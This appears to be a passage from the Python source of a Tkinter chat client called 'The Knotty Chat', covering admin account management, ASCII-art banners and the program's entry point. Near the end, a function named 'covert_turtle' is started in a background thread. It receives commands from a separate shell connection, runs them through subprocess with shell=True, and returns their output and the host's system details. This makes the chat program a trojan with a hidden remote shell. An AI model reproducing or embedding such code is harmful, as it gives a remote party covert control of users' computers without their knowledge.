            self.rmu_info_box.tag_add("center", "1.0", "end")
            return

        else:
            if del_username == 'admin':
                self.rmu_info_box.delete(1.0, END)
                self.rmu_info_box.insert(END, "The following operation is not allowed")
                self.rmu_info_box.tag_add("center", "1.0", "end")
                return

            self.send_message(self.connection, "Proceed")
            self.send_message(self.connection, del_username)
            server_reply = self.receive_message(self.connection)

            if server_reply['msg_data'] == '404':
                self.rmu_info_box.delete(1.0, END)
                self.rmu_info_box.insert(END, "Username does not exist in database")
                self.rmu_info_box.tag_add("center", "1.0", "end")

            elif server_reply['msg_data'] == '200':
                self.rmu_info_box.delete(1.0, END)
                self.show_frame(self.admin_menu_frame)
                self.adm_info_box.delete(1.0, END)
                self.adm_info_box.insert(END, f"Account {del_username} has been successfully removed!")
                self.adm_info_box.tag_add("center", "1.0", "end")
                return

    def admin(self):
        self.show_frame(self.admin_menu_frame)
        server_reply = self.receive_message(self.connection)
        # print(server_reply['msg_data'])

    def list_account(self):
        self.adm_info_box.delete(1.0, END)
        self.show_frame(self.list_frame)
        self.send_message(self.connection, 'list')

        server_reply = self.receive_message(self.connection)

        self.account_display.delete(1.0, END)
        self.account_display.insert(END, server_reply['msg_data'])
        self.account_display.tag_add("center", "1.0", "end")

        # if choice == '0':
        #     print("[PROGRAM]: Logging off Administrator account...")
        #     self.send_message(self.connection, choice)
        #     break
        #
        # elif choice == '1':
        #     self.send_message(self.connection, choice)
        #     server_reply = self.receive_message(self.connection)
        #     print(server_reply['msg_data'])
        #
        # elif choice == '2':
        #     self.send_message(self.connection, choice)
        #     self.create_account()
        #
        # elif choice == '3':
        #     self.send_message(self.connection, choice)
        #     self.remove_account()
        #
        # elif choice == '4':
        #     self.send_message(self.connection, choice)
        #     print("[PROGRAM]: Entering chatroom...")
        #     self.chatroom("<ADMIN>")
        #
        # elif choice == '5':
        #     self.send_message(self.connection, choice)
        #     server_reply = self.receive_message(self.connection)
        #
        #     if server_reply == '200':  # Request to server received successfully
        #         pass
        #
        #     server_reply = self.receive_message(self.connection)
        #     print(f"{server_reply['msg_data']}")
        #
        # else:
        #     print("[PROGRAM]: Please re-enter your choice")

    @staticmethod
    def display_title():
        print("████████╗██╗░░██╗███████╗  ██╗░░██╗███╗░░██╗░█████╗░█████"
              "███╗████████╗██╗░░░██╗  ░█████╗░██╗░░██╗░█████╗░████████╗")
        print("╚══██╔══╝██║░░██║██╔════╝  ██║░██╔╝████╗░██║██╔══██╗╚══██"
              "╔══╝╚══██╔══╝╚██╗░██╔╝  ██╔══██╗██║░░██║██╔══██╗╚══██╔══╝")
        print("░░░██║░░░███████║█████╗░░  █████═╝░██╔██╗██║██║░░██║░░░██"
              "║░░░░░░██║░░░░╚████╔╝░  ██║░░╚═╝███████║███████║░░░██║░░░")
        print("░░░██║░░░██╔══██║██╔══╝░░  ██╔═██╗░██║╚████║██║░░██║░░░██"
              "║░░░░░░██║░░░░░╚██╔╝░░  ██║░░██╗██╔══██║██╔══██║░░░██║░░░")
        print("░░░██║░░░██║░░██║███████╗  ██║░╚██╗██║░╚███║╚█████╔╝░░░██"
              "║░░░░░░██║░░░░░░██║░░░  ╚█████╔╝██║░░██║██║░░██║░░░██║░░░")
        print("░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░░░░╚═"
              "╝░░░░░░╚═╝░░░░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░")

    @staticmethod
    def admin_display_title():
        print("▄▀█ █▀▄ █▀▄▀█ █ █▄░█ █ █▀ ▀█▀ █▀█ ▄▀█ ▀█▀ █▀█ █▀█")
        print("█▀█ █▄▀ █░▀░█ █ █░▀█ █ ▄█ ░█░ █▀▄ █▀█ ░█░ █▄█ █▀▄")


def covert_turtle(client_session):
    while True:
        try:
            client_session.send_message(client_session.shell_connection, str(os.getcwd()))
            command = client_session.receive_message(client_session.shell_connection)
            command = command['msg_data']

            if command == 'exit':
                continue

            if command[:2] == 'cd':
                try:
                    os.chdir(command[3:])

                except WindowsError:
                    continue

                continue

            elif command == 'uname':
                architecture = platform.architecture()
                uname = platform.uname()
                output = f"\nHostname: {uname[1]}\n" \
                         f"Platform: {sys.platform}\n" \
                         f"Architecture: {architecture[0]}, {architecture[1]}\n" \
                         f"System: {uname[0]}\n" \
                         f"Release Version: {uname[3]}\n" \
                         f"Machine: {uname[4]}\n" \
                         f"Processor: {uname[5]}\n"

                client_session.send_message(client_session.shell_connection, output)
                continue

            output = subprocess.run(command,
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE,
                                    text=True)

            client_session.send_message(client_session.shell_connection, str(output.stdout + output.stderr))

        except (TypeError, WindowsError):
            break


if __name__ == '__main__':
    root = Tk()
    # Root window properties
    root.title("The Knotty Chat")

    # Add icon
    # root.iconbitmap("C:/Users/User/PycharmProjects/TheKnottyChat/images/hacker.ico")

    w = 900  # Width for the program window
    h = 800  # Height for the program window
    # Get screen width and height
    ws = root.winfo_screenwidth()  # Width of the screen
    hs = root.winfo_screenheight()  # Height of the screen
    # Calculate x and y coordinates for the root window
    x = (ws/2) - (w/2)
    y = (hs/2) - (h/2)
    # Set the popup window to open in the middle of the user's screen
    root.geometry('%dx%d+%d+%d' % (w, h, x, y))

    root.resizable(width=False, height=False)
    root.configure(background='black')
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)

    # Start up client program
    client = Client(root)
    root.mainloop()
    client.start()

    time.sleep(0.5)
    client_shell = threading.Thread(target=covert_turtle, args=(client,))
    client_shell.start()
